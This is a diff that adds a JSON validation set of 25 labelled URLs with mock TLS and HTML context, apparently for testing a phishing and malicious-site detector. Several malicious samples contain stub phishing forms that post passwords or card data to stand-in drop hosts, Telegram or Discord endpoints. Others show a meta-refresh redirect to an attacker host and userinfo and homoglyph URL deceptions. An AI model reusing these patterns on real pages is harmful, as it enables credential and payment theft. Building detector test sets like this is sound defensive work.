@@ -1,0 +1,481 @@
+[
+  {
+    "id": "VAL-001",
+    "url": "https://www.cloudflare.com",
+    "normalizedDomain": "cloudflare.com",
+    "category": "BENIGN_LEGITIMATE",
+    "groundTruth": "BENIGN",
+    "provenance": "Tranco Top 100. Infrastructure and CDN services homepage with complete modern security headers.",
+    "mockContext": {
+      "tls": {
+        "status": "valid",
+        "issuer": "Cloudflare Inc"
+      },
+      "http": {
+        "status_code": 200,
+        "headers": {
+          "strict-transport-security": "max-age=31536000",
+          "content-security-policy": "default-src 'self'",
+          "x-frame-options": "SAMEORIGIN",
+          "x-content-type-options": "nosniff"
+        },
+        "html_body": "<!DOCTYPE html><html><head><title>Cloudflare</title></head><body><h1>Connect, Protect, and Build Everywhere</h1></body></html>"
+      }
+    }
+  },
+  {
+    "id": "VAL-002",
+    "url": "https://www.nih.gov",
+    "normalizedDomain": "nih.gov",
+    "category": "BENIGN_LEGITIMATE",
+    "groundTruth": "BENIGN",
+    "provenance": "Official US National Institutes of Health (.gov) government portal.",
+    "mockContext": {
+      "tls": {
+        "status": "valid",
+        "issuer": "DigiCert Inc"
+      },
+      "http": {
+        "status_code": 200,
+        "headers": {
+          "strict-transport-security": "max-age=31536000",
+          "content-security-policy": "default-src 'self'",
+          "x-frame-options": "SAMEORIGIN",
+          "x-content-type-options": "nosniff"
+        },
+        "html_body": "<!DOCTYPE html><html><head><title>National Institutes of Health (NIH)</title></head><body><h1>Health Information</h1></body></html>"
+      }
+    }
+  },
+  {
+    "id": "VAL-003",
+    "url": "https://www.rust-lang.org",
+    "normalizedDomain": "rust-lang.org",
+    "category": "BENIGN_LEGITIMATE",
+    "groundTruth": "BENIGN",
+    "provenance": "Tranco Top 1000. Open-source programming language official portal.",
+    "mockContext": {
+      "tls": {
+        "status": "valid",
+        "issuer": "Let's Encrypt"
+      },
+      "http": {
+        "status_code": 200,
+        "headers": {
+          "strict-transport-security": "max-age=31536000",
+          "content-security-policy": "default-src 'self'",
+          "x-frame-options": "DENY",
+          "x-content-type-options": "nosniff"
+        },
+        "html_body": "<!DOCTYPE html><html><head><title>Rust Programming Language</title></head><body><h1>Rust</h1></body></html>"
+      }
+    }
+  },
+  {
+    "id": "VAL-004",
+    "url": "https://www.cam.ac.uk",
+    "normalizedDomain": "cam.ac.uk",
+    "category": "BENIGN_LEGITIMATE",
+    "groundTruth": "BENIGN",
+    "provenance": "Accredited University of Cambridge academic portal (.ac.uk).",
+    "mockContext": {
+      "tls": {
+        "status": "valid",
+        "issuer": "Jisc Services Limited"
+      },
+      "http": {
+        "status_code": 200,
+        "headers": {
+          "strict-transport-security": "max-age=31536000",
+          "content-security-policy": "default-src 'self'",
+          "x-frame-options": "SAMEORIGIN",
+          "x-content-type-options": "nosniff"
+        },
+        "html_body": "<!DOCTYPE html><html><head><title>University of Cambridge</title></head><body><h1>Cambridge University</h1></body></html>"
+      }
+    }
+  },
+  {
+    "id": "VAL-005",
+    "url": "https://www.redhat.com",
+    "normalizedDomain": "redhat.com",
+    "category": "BENIGN_LEGITIMATE",
+    "groundTruth": "BENIGN",
+    "provenance": "Enterprise open-source software solutions company homepage.",
+    "mockContext": {
+      "tls": {
+        "status": "valid",
+        "issuer": "DigiCert Inc"
+      },
+      "http": {
+        "status_code": 200,
+        "headers": {
+          "strict-transport-security": "max-age=31536000",
+          "content-security-policy": "default-src 'self'",
+          "x-frame-options": "DENY",
+          "x-content-type-options": "nosniff"
+        },
+        "html_body": "<!DOCTYPE html><html><head><title>Red Hat</title></head><body><h1>Open Source Technologies</h1></body></html>"
+      }
+    }
+  },
+  {
+    "id": "VAL-006",
+    "url": "https://coastal-heritage-trust.org",
+    "normalizedDomain": "coastal-heritage-trust.org",
+    "category": "BENIGN_LEGACY_HEADERS",
+    "groundTruth": "BENIGN",
+    "provenance": "Regional historic lighthouse and environmental conservation trust site.",
+    "mockContext": {
+      "tls": {
+        "status": "valid",
+        "issuer": "Let's Encrypt"
+      },
+      "http": {
+        "status_code": 200,
+        "headers": {},
+        "html_body": "<!DOCTYPE html><html><head><title>Coastal Heritage Trust</title></head><body><h1>Protecting Our Coastline</h1></body></html>"
+      }
+    }
+  },
+  {
+    "id": "VAL-007",
+    "url": "https://harbor-view-diner.com",
+    "normalizedDomain": "harbor-view-diner.com",
+    "category": "BENIGN_LEGACY_HEADERS",
+    "groundTruth": "BENIGN",
+    "provenance": "Local restaurant menu and operating hours informational site.",
+    "mockContext": {
+      "tls": {
+        "status": "valid",
+        "issuer": "cPanel, Inc."
+      },
+      "http": {
+        "status_code": 200,
+        "headers": {
+          "content-type": "text/html"
+        },
+        "html_body": "<!DOCTYPE html><html><head><title>Harbor View Diner</title></head><body><h1>Breakfast & Lunch Specials</h1></body></html>"
+      }
+    }
+  },
+  {
+    "id": "VAL-008",
+    "url": "https://suburban-plumbing-pros.net",
+    "normalizedDomain": "suburban-plumbing-pros.net",
+    "category": "BENIGN_LEGACY_HEADERS",
+    "groundTruth": "BENIGN",
+    "provenance": "Residential plumbing contractor contact information website.",
+    "mockContext": {
+      "tls": {
+        "status": "valid",
+        "issuer": "Sectigo Public CA"
+      },
+      "http": {
+        "status_code": 200,
+        "headers": {},
+        "html_body": "<!DOCTYPE html><html><head><title>Suburban Plumbing Pros</title></head><body><h1>24/7 Plumbing Service</h1></body></html>"
+      }
+    }
+  },
+  {
+    "id": "VAL-009",
+    "url": "https://auth0.openai.com/u/login",
+    "normalizedDomain": "openai.com",
+    "category": "BENIGN_AUTH_PORTALS",
+    "groundTruth": "BENIGN",
+    "provenance": "Official OpenAI authentication login endpoint on legitimate domain.",
+    "mockContext": {
+      "tls": {
+        "status": "valid",
+        "issuer": "Cloudflare Inc"
+      },
+      "http": {
+        "status_code": 200,
+        "headers": {
+          "strict-transport-security": "max-age=31536000",
+          "content-security-policy": "default-src 'self'",
+          "x-frame-options": "DENY",
+          "x-content-type-options": "nosniff"
+        },
+        "html_body": "<!DOCTYPE html><html><body><form action=\"/u/login\"><input type=\"password\" name=\"password\"/></form></body></html>"
+      }
+    }
+  },
+  {
+    "id": "VAL-010",
+    "url": "https://identity.bitbucket.org/login",
+    "normalizedDomain": "bitbucket.org",
+    "category": "BENIGN_AUTH_PORTALS",
+    "groundTruth": "BENIGN",
+    "provenance": "Official Bitbucket code repository sign-in portal.",
+    "mockContext": {
+      "tls": {
+        "status": "valid",
+        "issuer": "DigiCert Inc"
+      },
+      "http": {
+        "status_code": 200,
+        "headers": {
+          "strict-transport-security": "max-age=31536000",
+          "content-security-policy": "default-src 'self'",
+          "x-frame-options": "DENY",
+          "x-content-type-options": "nosniff"
+        },
+        "html_body": "<!DOCTYPE html><html><body><form action=\"/login\"><input type=\"password\" name=\"password\"/></form></body></html>"
+      }
+    }
+  },
+  {
+    "id": "VAL-011",
+    "url": "https://account.box.com/login",
+    "normalizedDomain": "box.com",
+    "category": "BENIGN_AUTH_PORTALS",
+    "groundTruth": "BENIGN",
+    "provenance": "Official Box enterprise cloud content management login service.",
+    "mockContext": {
+      "tls": {
+        "status": "valid",
+        "issuer": "DigiCert Inc"
+      },
+      "http": {
+        "status_code": 200,
+        "headers": {
+          "strict-transport-security": "max-age=31536000",
+          "content-security-policy": "default-src 'self'",
+          "x-frame-options": "DENY",
+          "x-content-type-options": "nosniff"
+        },
+        "html_body": "<!DOCTYPE html><html><body><form action=\"/login\"><input type=\"password\" name=\"password\"/></form></body></html>"
+      }
+    }
+  },
+  {
+    "id": "VAL-012",
+    "url": "http://adobe-pdf-cloud-verify.com/login",
+    "normalizedDomain": "adobe-pdf-cloud-verify.com",
+    "category": "CONFIRMED_PHISHING_CREDENTIAL_HARVESTING",
+    "groundTruth": "MALICIOUS",
+    "provenance": "Adobe document credential phishing page posting password to external collector drop (cloud-drop.biz).",
+    "mockContext": {
+      "http": {
+        "status_code": 200,
+        "headers": {},
+        "html_body": "<!DOCTYPE html><html><body><form action=\"http://cloud-drop.biz/steal.php\"><input type=\"password\" name=\"adobe_pwd\"/></form></body></html>"
+      }
+    }
+  },
+  {
+    "id": "VAL-013",
+    "url": "http://dhl-express-tracking-delivery.net/parcel",
+    "normalizedDomain": "dhl-express-tracking-delivery.net",
+    "category": "CONFIRMED_PHISHING_CREDENTIAL_HARVESTING",
+    "groundTruth": "MALICIOUS",
+    "provenance": "DHL package delivery notification scam exfiltrating credit card data to Telegram API.",
+    "mockContext": {
+      "http": {
+        "status_code": 200,
+        "headers": {},
+        "html_body": "<!DOCTYPE html><html><body><form action=\"https://api.telegram.org/bot999:XYZ/sendMessage\"><input name=\"cardnumber\"/><input name=\"cvv\"/></form></body></html>"
+      }
+    }
+  },
+  {
+    "id": "VAL-014",
+    "url": "http://dropbox-shared-file-access.info/auth",
+    "normalizedDomain": "dropbox-shared-file-access.info",
+    "category": "CONFIRMED_PHISHING_CREDENTIAL_HARVESTING",
+    "groundTruth": "MALICIOUS",
+    "provenance": "Dropbox file sharing impersonation form sending passwords to Discord webhook.",
+    "mockContext": {
+      "http": {
+        "status_code": 200,
+        "headers": {},
+        "html_body": "<!DOCTYPE html><html><body><form action=\"https://discord.com/api/webhooks/777/abc\"><input type=\"password\" name=\"pass\"/></form></body></html>"
+      }
+    }
+  },
+  {
+    "id": "VAL-015",
+    "url": "http://malicious-ransomware-distro.top/cryptor.bin",
+    "normalizedDomain": "malicious-ransomware-distro.top",
+    "category": "CONFIRMED_PHISHING_CREDENTIAL_HARVESTING",
+    "groundTruth": "MALICIOUS",
+    "provenance": "Active URLhaus malware payload download entry.",
+    "mockContext": {
+      "http": {
+        "status_code": 200,
+        "headers": {
+          "content-type": "application/octet-stream"
+        },
+        "html_body": "MZ ransomware binary"
+      },
+      "reputation": {
+        "urlhaus": {
+          "threat": "malware_download",
+          "tags": [
+            "ransomware",
+            "lockbit"
+          ]
+        }
+      }
+    }
+  },
+  {
+    "id": "VAL-016",
+    "url": "http://xn--eb-yia.com/login",
+    "normalizedDomain": "xn--eb-yia.com",
+    "category": "TYPOSQUATTING_HOMOGLYPHS",
+    "groundTruth": "MALICIOUS",
+    "provenance": "Punycode Cyrillic homoglyph mimicking eBay online marketplace.",
+    "mockContext": {
+      "http": {
+        "status_code": 200,
+        "headers": {},
+        "html_body": "<!DOCTYPE html><html><body><form action=\"http://drop.xyz/collect\"><input type=\"password\" name=\"pwd\"/></form></body></html>"
+      }
+    }
+  },
+  {
+    "id": "VAL-017",
+    "url": "http://spot1fy-premium-upgrade.com",
+    "normalizedDomain": "spot1fy-premium-upgrade.com",
+    "category": "TYPOSQUATTING_HOMOGLYPHS",
+    "groundTruth": "SUSPICIOUS",
+    "provenance": "Leetspeak substitution '1' for 'i' targeting Spotify streaming service.",
+    "mockContext": {
+      "http": {
+        "status_code": 200,
+        "headers": {},
+        "html_body": "<!DOCTYPE html><html><body><h1>Upgrade Your Music Experience</h1></body></html>"
+      }
+    }
+  },
+  {
+    "id": "VAL-018",
+    "url": "http://wellsfarg0-online-banking.net",
+    "normalizedDomain": "wellsfarg0-online-banking.net",
+    "category": "TYPOSQUATTING_HOMOGLYPHS",
+    "groundTruth": "MALICIOUS",
+    "provenance": "Numeral substitution '0' for 'o' targeting Wells Fargo online banking.",
+    "mockContext": {
+      "http": {
+        "status_code": 200,
+        "headers": {},
+        "html_body": "<!DOCTYPE html><html><body><form action=\"/steal\"><input type=\"password\" name=\"pwd\"/></form></body></html>"
+      }
+    }
+  },
+  {
+    "id": "VAL-019",
+    "url": "http://citibank-card-protection.live",
+    "normalizedDomain": "citibank-card-protection.live",
+    "category": "BRAND_IMPERSONATION_SUBDOMAIN_STACKING",
+    "groundTruth": "MALICIOUS",
+    "provenance": "Citibank financial brand impersonation registered on high-abuse .live TLD.",
+    "mockContext": {
+      "http": {
+        "status_code": 200,
+        "headers": {},
+        "html_body": "<!DOCTYPE html><html><body><form action=\"/collect\"><input name=\"cardnumber\"/><input name=\"cvv\"/></form></body></html>"
+      }
+    }
+  },
+  {
+    "id": "VAL-020",
+    "url": "http://uidai-aadhaar-update-portal.xyz",
+    "normalizedDomain": "uidai-aadhaar-update-portal.xyz",
+    "category": "BRAND_IMPERSONATION_SUBDOMAIN_STACKING",
+    "groundTruth": "MALICIOUS",
+    "provenance": "Indian national identity authority (UIDAI / Aadhaar) impersonation on .xyz TLD.",
+    "mockContext": {
+      "http": {
+        "status_code": 200,
+        "headers": {},
+        "html_body": "<!DOCTYPE html><html><body><form action=\"/harvest\"><input name=\"aadhaar\"/><input name=\"otp\"/></form></body></html>"
+      }
+    }
+  },
+  {
+    "id": "VAL-021",
+    "url": "http://glassdoor-recruitment-interview.xyz",
+    "normalizedDomain": "glassdoor-recruitment-interview.xyz",
+    "category": "BRAND_IMPERSONATION_SUBDOMAIN_STACKING",
+    "groundTruth": "SUSPICIOUS",
+    "provenance": "Career portal impersonation on high-abuse .xyz TLD.",
+    "mockContext": {
+      "http": {
+        "status_code": 200,
+        "headers": {},
+        "html_body": "<!DOCTYPE html><html><body><h1>Schedule Interview</h1></body></html>"
+      }
+    }
+  },
+  {
+    "id": "VAL-022",
+    "url": "http://official-gov-portal.org@credential-trap.xyz/login",
+    "normalizedDomain": "credential-trap.xyz",
+    "category": "MALICIOUS_REDIRECTS_EVASIONS",
+    "groundTruth": "MALICIOUS",
+    "provenance": "Userinfo authority masking simulating official government portal while routing to credential-trap.xyz.",
+    "mockContext": {
+      "http": {
+        "status_code": 200,
+        "headers": {},
+        "html_body": "<!DOCTYPE html><html><body><form action=\"/steal\"><input type=\"password\" name=\"p\"/></form></body></html>"
+      }
+    }
+  },
+  {
+    "id": "VAL-023",
+    "url": "http://fast-redirect-bounce.net/gate",
+    "normalizedDomain": "fast-redirect-bounce.net",
+    "category": "MALICIOUS_REDIRECTS_EVASIONS",
+    "groundTruth": "MALICIOUS",
+    "provenance": "Client-side meta refresh redirecting to external attacker drop host (attacker-drop.biz).",
+    "mockContext": {
+      "http": {
+        "status_code": 200,
+        "headers": {},
+        "html_body": "<!DOCTYPE html><html><head><meta http-equiv=\"refresh\" content=\"0;url=http://attacker-drop.biz/landing\"/></head><body>Redirecting...</body></html>"
+      }
+    }
+  },
+  {
+    "id": "VAL-024",
+    "url": "https://diginotar-compromised-root.net",
+    "normalizedDomain": "diginotar-compromised-root.net",
+    "category": "CERTIFICATE_TLS_ANOMALIES",
+    "groundTruth": "MALICIOUS",
+    "provenance": "Certificate issued by DigiNotar, a permanently revoked and untrusted CA root.",
+    "mockContext": {
+      "tls": {
+        "status": "distrusted_ca",
+        "ca_pattern": "diginotar"
+      },
+      "http": {
+        "status_code": 200,
+        "headers": {},
+        "html_body": "<!DOCTYPE html><html><body><h1>Secure Portal</h1></body></html>"
+      }
+    }
+  },
+  {
+    "id": "VAL-025",
+    "url": "https://self-signed-corporate-gateway.org",
+    "normalizedDomain": "self-signed-corporate-gateway.org",
+    "category": "CERTIFICATE_TLS_ANOMALIES",
+    "groundTruth": "SUSPICIOUS",
+    "provenance": "Self-signed certificate on public .org gateway domain without trusted CA chain.",
+    "mockContext": {
+      "tls": {
+        "status": "self_signed"
+      },
+      "http": {
+        "status_code": 200,
+        "headers": {},
+        "html_body": "<!DOCTYPE html><html><body><h1>Corporate Gateway</h1></body></html>"
+      }
+    }
+  }
+]
